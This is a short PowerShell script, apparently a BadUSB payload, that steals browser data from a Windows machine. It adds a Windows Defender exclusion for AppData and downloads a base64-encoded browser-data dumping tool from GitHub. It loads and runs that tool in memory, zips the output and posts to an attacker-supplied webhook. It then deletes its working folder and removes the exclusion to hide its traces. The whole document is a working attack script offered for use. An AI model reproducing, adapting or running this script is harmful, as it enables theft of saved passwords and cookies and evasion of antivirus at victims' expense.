$WH_URL = WEBHOOK
Add-MpPreference -ExclusionPath "$env:appdata"
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
if ($null -eq $HBbytes) {
    $HBbytes = Invoke-RestMethod "https://github.com/GamehunterKaan/BadUSB-Suite/raw/main/templates/browser/hackbrowser.b64"
    $HBassembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($HBbytes))
    $HBentrypoint = $HBassembly.GetType('Sharphackbrowserdata.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
}
$HBentrypoint.Invoke($null, (, [string[]] ('','')))
Compress-Archive -Path * -DestinationPath dump.zip
curl -H "Content-Type: application/json" -d "{`"username`": " + $env:USERNAME + ", `"content`": `"hello`"}" $WH_URL
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"